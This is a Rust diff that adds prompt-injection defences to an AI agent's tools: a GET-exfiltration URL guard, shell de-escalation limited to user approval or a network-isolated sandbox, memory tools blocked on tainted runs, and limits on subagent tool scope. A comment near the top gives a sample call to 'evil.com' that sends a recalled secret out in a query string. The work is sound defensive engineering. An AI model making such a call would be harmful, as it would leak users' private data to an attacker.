@@ -64,6 +64,45 @@ fn is_blocked_ip(ip: &std::net::IpAddr) -> bool {
     is_blocked_ip_ex(ip, false)
 }
 
+/// The exfiltration ceiling on a URL path when the lethal trifecta is armed (untrusted + sensitive).
+/// A GET's host+path is a data-OUT channel (markdown-image/GET beaconing): an injected page can tell
+/// the model to `web_fetch("https://evil.com/?q=<recalled-secret>")`, and the SSRF guard only blocks
+/// PRIVATE IPs, not public attacker hosts. So on a trifecta run we refuse a fetch/browse whose URL
+/// carries a query string or an over-long path — the classic exfil vectors — while still allowing
+/// ordinary clean-URL research to proceed. Ingress isn't blocked; the covert OUT-channel is.
+const EXFIL_PATH_MAX: usize = 96;
+
+/// On a trifecta-armed run, refuse a research URL that could smuggle data OUT via its query string or
+/// an unusually long path. `trifecta` is `ctx.taint.is_untrusted() && ctx.sensitive`. A no-op when the
+/// trifecta isn't armed, so pure web research (untrusted-but-not-sensitive) is unaffected.
+pub(crate) fn guard_exfil_url(url: &str, trifecta: bool) -> Result<(), String> {
+    if !trifecta {
+        return Ok(());
+    }
+    let after = url.trim().split_once("://").map(|(_, b)| b).unwrap_or("");
+    // A query string on a GET is the primary covert channel; refuse it outright.
+    if after.contains('?') || after.contains('#') {
+        return Err(
+            "refused: this run holds private data and has read untrusted content, so a fetch/browse \
+             carrying a query string is blocked (GET-exfiltration guard). Request the user's approval \
+             or use a clean URL with no query."
+                .into(),
+        );
+    }
+    // An over-long path is the other beacon shape (secret encoded into the path).
+    let path = after.split(['?', '#']).next().unwrap_or("");
+    let path = &path[path.find('/').unwrap_or(path.len())..];
+    if path.trim_matches('/').len() > EXFIL_PATH_MAX {
+        return Err(
+            "refused: this run holds private data and has read untrusted content, so a fetch/browse \
+             with an unusually long URL path is blocked (GET-exfiltration guard). Request approval or \
+             shorten the URL."
+                .into(),
+        );
+    }
+    Ok(())
+}
+
 /// SSRF address classifier. With `allow_local` it permits loopback/private/link-local/CGNAT ranges —
 /// used ONLY for a URL the USER explicitly configured (e.g. a self-hosted SearXNG at localhost or a
 /// LAN box), which is trusted, unlike a URL that came from the model or a fetched web page. The
@@ -791,20 +830,57 @@ impl Tool for ShellTool {
         if !ctx.policy.allow_shell {
             return Err("shell tool is disabled (set ENGRAM_TOOLS_SHELL=1 to enable)".into());
         }
+        let backend = ctx.policy.shell_backend.as_deref();
         if ctx.taint.is_untrusted() {
-            return Err("shell refused: this run read untrusted content (injection guard)".into());
+            // The injection guard blocks shell on a tainted run because untrusted content could steer
+            // a command to exfiltrate/damage. Two things safely lift it, and both are ledgered:
+            //   (a) an explicit one-time human approval (the same `approved` escape the egress gate
+            //       uses) — a human is watching and signed off on running-after-reading; or
+            //   (b) a network-isolated backend — the built-in OS `sandbox` (network-denied) or the
+            //       Docker backend (`docker run --network none`, see `shell_command`): with no
+            //       network there IS no exfiltration channel, the precise risk the taint gate stops.
+            //       `ssh:` (runs on a remote host with network) and `singularity:` (no network flag)
+            //       are NOT isolated, so they still require explicit approval.
+            let sandboxed = match backend {
+                Some("sandbox") => true,
+                Some(b) if b.starts_with("ssh:") || b.starts_with("singularity:") => false,
+                Some(_) => true, // docker image → --network none
+                None => false,   // plain local shell → full network
+            };
+            if ctx.policy.approved {
+                let _ = ctx.ledger.append(
+                    "agent.shell_deescalated",
+                    "agent",
+                    json!({ "reason": "user_approved" }),
+                );
+            } else if sandboxed {
+                let _ = ctx.ledger.append(
+                    "agent.shell_deescalated",
+                    "agent",
+                    json!({ "reason": "network_isolated_sandbox", "backend": backend }),
+                );
+            } else {
+                return Err(
+                    "shell refused: this run read untrusted content (injection guard). Get the user's \
+                     one-time approval, or run in the network-isolated Docker sandbox, to proceed."
+                        .into(),
+                );
+            }
         }
         let command = arg_str(args, "command")?;
-        let backend = ctx.policy.shell_backend.as_deref();
         let _ = ctx.ledger.append(
             "agent.shell",
             "agent",
             json!({ "command": command, "backend": backend.unwrap_or("local") }),
         );
         let (program, cmd_args) = shell_command(backend, &ctx.workdir, command);
+        // kill_on_drop: when the timeout fires the future is dropped — without this the `sh -c`
+        // child (an infinite loop, a long download) keeps running unbounded with full privileges
+        // AFTER the agent was told the command timed out, and can still mutate the workdir mid-run.
         let fut = tokio::process::Command::new(&program)
             .args(&cmd_args)
             .current_dir(&ctx.workdir)
+            .kill_on_drop(true)
             .output();
         let out = tokio::time::timeout(Duration::from_secs(ctx.policy.timeout_secs), fut)
             .await
@@ -1667,19 +1743,26 @@ impl Tool for MemoryRecallTool {
         true
     }
     async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
+        // An untrusted-origin run (inbound channel/Telegram/webhook) returns its answer verbatim to an
+        // anonymous requester — a reply channel the trifecta egress gate does NOT cover — and recall
+        // serves the private user-global ring. Refuse here, at the tool, so the guarantee holds no
+        // matter how the toolset was assembled: the daemon strips this tool from untrusted top-level
+        // runs, but a DELEGATED subagent rebuilds its toolset from sub_tools() and would otherwise
+        // still expose it. (This is the single chokepoint that closes that bypass.)
+        if ctx.taint.is_untrusted() {
+            return Err(
+                "memory_recall is unavailable on a run that has read untrusted content (private-memory guard)"
+                    .into(),
+            );
+        }
         let query = arg_str(args, "query")?;
         let k = args["k"].as_u64().unwrap_or(5) as usize;
-        // A trusted run gets trusted-provenance memories only (injected web/memory content
-        // can't poison it). An already-tainted run may see all - its egress is blocked
-        // anyway and it can legitimately use what it just researched.
-        // Ringed to the run's scope, so a deliberate recall inside a project chat surfaces only this
-        // project's memory ∪ user-global, never another project's.
-        let hits = if ctx.taint.is_untrusted() {
-            ctx.memory.recall_scoped(query, &[], k, &ctx.scope)
-        } else {
-            ctx.memory.recall_trusted_scoped(query, &[], k, &ctx.scope)
-        }
-        .map_err(|e| e.to_string())?;
+        // Trusted-provenance memories only (injected web/memory content can't poison it), ringed to the
+        // run's scope so a deliberate recall in a project chat surfaces only this project ∪ user-global.
+        let hits = ctx
+            .memory
+            .recall_trusted_scoped(query, &[], k, &ctx.scope)
+            .map_err(|e| e.to_string())?;
         if hits.is_empty() {
             return Ok("(no relevant memories)".into());
         }
@@ -1707,6 +1790,14 @@ impl Tool for MemoryRememberTool {
             "required": ["text"] })
     }
     async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
+        // Same guarantee as memory_recall: an untrusted-origin run must not touch the memory store,
+        // enforced at the tool so a delegated subagent (which rebuilds its toolset) can't reach it.
+        if ctx.taint.is_untrusted() {
+            return Err(
+                "memory_remember is unavailable on a run that has read untrusted content (private-memory guard)"
+                    .into(),
+            );
+        }
         let text = arg_str(args, "text")?;
         let region = match args["region"].as_str() {
             Some("identity") => Region::Identity,
@@ -1925,10 +2016,20 @@ impl Tool for DelegateTool {
             "agent",
             json!({ "task": task, "depth": ctx.depth }),
         );
-        // The subagent gets the base toolset (no further delegation by default) and a
-        // deeper context, but inherits taint - an untrusted parent yields an untrusted child.
-        let agent =
-            crate::agent::Agent::new(ctx.gateway.clone(), crate::sub_tools(), ctx.model.clone());
+        // The subagent gets the base toolset (no further delegation by default) and a deeper context,
+        // but inherits the parent's guarantees:
+        //  - taint/sensitive (an untrusted parent yields an untrusted child) via the cloned ctx;
+        //  - the kill switch, shared token budget, and step/narration callbacks — carried on the ctx
+        //    (seeded from the parent Agent at its run entry), so a delegated run can be cancelled,
+        //    counts against the SAME budget, and is visible in the UI like the parent;
+        //  - the parent's TOOL SCOPE: the sub-toolset is intersected with `allowed_tools` so a
+        //    delegated worker can never exceed the tool permissions the parent was restricted to.
+        let mut sub_tools = crate::sub_tools();
+        if let Some(allowed) = &ctx.allowed_tools {
+            let allowed = allowed.clone();
+            sub_tools = sub_tools.retaining(move |name| allowed.iter().any(|a| a == name));
+        }
+        let agent = crate::agent::Agent::new(ctx.gateway.clone(), sub_tools, ctx.model.clone());
         let mut sub = ctx.clone();
         sub.depth = ctx.depth + 1;
         let run = agent.run(task, sub).await.map_err(|e| e.to_string())?;
@@ -1999,6 +2100,9 @@ async fn chrome_dump_dom(url: &str, timeout: u64) -> Result<String, String> {
         .arg(&pin)
         .arg("--dump-dom")
         .arg(url)
+        // Kill the headless Chrome if the timeout drops this future, so a hung render doesn't leak
+        // a Chrome process for the rest of the daemon's life.
+        .kill_on_drop(true)
         .output();
     let out = tokio::time::timeout(Duration::from_secs(timeout), fut)
         .await
@@ -2031,6 +2135,8 @@ async fn chrome_screenshot(
         .arg("--window-size=1280,1024")
         .arg(format!("--screenshot={}", out_path.display()))
         .arg(url)
+        // Same as chrome_dump_dom: don't leak a headless Chrome when the render times out.
+        .kill_on_drop(true)
         .output();
     tokio::time::timeout(Duration::from_secs(timeout), fut)
         .await
@@ -2065,9 +2171,12 @@ impl Tool for BrowserReadTool {
     async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
         let url = arg_str(args, "url")?;
         guard_url(url).await?;
+        // Same GET-exfiltration guard as web_fetch: a browse URL's query/path is a data-out channel.
+        let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
+        guard_exfil_url(url, trifecta)?;
         let _ = ctx
             .ledger
-            .append("agent.browser_read", "agent", json!({ "url": url }));
+            .append("agent.browser_read", "agent", json!({ "url": url, "dest": crate::agent::host_of(url) }));
         let html = chrome_dump_dom(url, ctx.policy.timeout_secs.max(30)).await?;
         Ok(html_to_text(&html))
     }
@@ -2106,6 +2215,8 @@ impl Tool for BrowserScreenshotTool {
         // authenticated, multi-step page (not a throwaway cookieless Chrome).
         if let Some(url) = args["url"].as_str() {
             guard_url(url).await?;
+            let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
+            guard_exfil_url(url, trifecta)?;
             ctx.browser.open(url).await?;
         }
         let _ = ctx
@@ -2222,9 +2333,12 @@ impl Tool for BrowserOpenTool {
     async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
         let url = arg_str(args, "url")?;
         guard_url(url).await?;
+        // Same GET-exfiltration guard as web_fetch: a navigation URL's query/path is a data-out channel.
+        let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
+        guard_exfil_url(url, trifecta)?;
         let _ = ctx
             .ledger
-            .append("agent.browser_open", "agent", json!({ "url": url }));
+            .append("agent.browser_open", "agent", json!({ "url": url, "dest": crate::agent::host_of(url) }));
         ctx.browser.open(url).await
     }
 }
@@ -2539,9 +2653,14 @@ mod web {
         async fn run(&self, args: &Value, ctx: &ToolCtx) -> Result<String, String> {
             let url = arg_str(args, "url")?;
             super::guard_url(url).await?;
+            // Close the GET-exfiltration channel on a trifecta run (unless the user approved this run):
+            // a fetch's URL query/path can carry recalled secrets to a public attacker host that the
+            // SSRF guard doesn't block. Clean research URLs still pass.
+            let trifecta = ctx.taint.is_untrusted() && ctx.sensitive && !ctx.policy.approved;
+            super::guard_exfil_url(url, trifecta)?;
             let _ = ctx
                 .ledger
-                .append("agent.web_fetch", "agent", json!({ "url": url }));
+                .append("agent.web_fetch", "agent", json!({ "url": url, "dest": crate::agent::host_of(url) }));
             let to = ctx.policy.timeout_secs;
             // Direct fetch first (fast, no third party). If it errors or yields almost no readable
             // text (a JS-only shell or a bot-block page), fall back to the Jina reader proxy, which
@@ -2553,17 +2672,48 @@ mod web {
                     return Ok(text.clone());
                 }
             }
-            if let Ok(read) = jina_read(url, to).await {
-                if read.trim().len() >= 200 {
-                    return Ok(read);
+            // The Jina reader fallback sends the FULL target URL to a THIRD PARTY (r.jina.ai). For a
+            // local-first, auditable-egress product that is a disclosure the user must opt into: it's
+            // OFF unless ENGRAM_JINA_FALLBACK is set truthy, we ledger the proxied fetch naming the
+            // proxy host as the destination, and we NEVER proxy a URL carrying a query string or
+            // userinfo (which could leak a capability token / share link off-device).
+            if jina_fallback_enabled() && jina_safe_to_proxy(url) {
+                let _ = ctx.ledger.append(
+                    "agent.web_fetch_proxied",
+                    "agent",
+                    json!({ "url": url, "dest": "r.jina.ai", "proxy": "r.jina.ai" }),
+                );
+                if let Ok(read) = jina_read(url, to).await {
+                    if read.trim().len() >= 200 {
+                        return Ok(read);
+                    }
                 }
             }
             direct // the (possibly thin) direct result, or its original error
         }
     }
 
+    /// Whether the third-party Jina reader fallback is enabled. Default OFF (local-first / auditable
+    /// egress): set `ENGRAM_JINA_FALLBACK=1` (or true/yes/on) to opt in. The daemon can surface this
+    /// as a Settings → Web toggle that sets the env var.
+    fn jina_fallback_enabled() -> bool {
+        std::env::var("ENGRAM_JINA_FALLBACK")
+            .ok()
+            .map(|v| matches!(v.trim().to_ascii_lowercase().as_str(), "1" | "true" | "yes" | "on"))
+            .unwrap_or(false)
+    }
+
+    /// Never hand a URL with a query string, fragment, or userinfo to the proxy — those are exactly
+    /// where signed/capability tokens and private share parameters live, and disclosing them to a
+    /// third party is the leak we're guarding against.
+    fn jina_safe_to_proxy(url: &str) -> bool {
+        let after = url.split_once("://").map(|(_, b)| b).unwrap_or(url);
+        !after.contains('?') && !after.contains('#') && !after.contains('@')
+    }
+
     /// Read a page via the Jina reader proxy (r.jina.ai) — renders JS server-side and returns clean
     /// markdown. Free, no key, no browser. A reliable fallback for pages a raw fetch can't read.
+    /// Only called when the user has opted in and the URL is safe to disclose (see the callers above).
     async fn jina_read(url: &str, timeout: u64) -> Result<String, String> {
         // r.jina.ai/<full-url>: the proxy is a public host (SSRF-vetted by get_text); the target URL
         // was already guard_url'd by the caller.
@@ -2739,6 +2889,24 @@ mod web {
         }
         fn side_effecting(&self) -> bool {
             true
+        }
+        // Resolve the destination the tool WILL ACTUALLY contact, in the SAME precedence `run` uses:
+        // explicit `url` > the configured webhook (settings) > ENGRAM_WEBHOOK_URL. This is what lets
+        // the autonomy gate allowlist the user's own configured channel even for a url-less digest,
+        // and stops a decoy `url` from spoofing the gate (there's no other recipient arg here, but the
+        // gate now trusts the tool's answer rather than scanning arbitrary keys of model JSON).
+        fn egress_dest(&self, args: &Value, ctx: &ToolCtx) -> Option<String> {
+            let url = args["url"]
+                .as_str()
+                .map(str::to_string)
+                .filter(|s| !s.trim().is_empty())
+                .or_else(|| ctx.policy.webhook_url.clone())
+                .or_else(|| std::env::var("ENGRAM_WEBHOOK_URL").ok())?;
+            let url = url.trim();
+            if url.is_empty() {
+                return None;
+            }
+            Some(crate::agent::host_of(url))
         }
         fn schema(&self) -> Value {
             json!({ "type": "object",
@@ -3270,6 +3438,12 @@ mod file_tools_tests {
             depth: 0,
             browser: Arc::new(crate::tool::NoBrowser),
             scope: engram_core::ScopeCtx::any(),
+            halt: None,
+            spend_counter: None,
+            token_budget: None,
+            on_step: None,
+            on_narration: None,
+            allowed_tools: None,
         }
     }
 
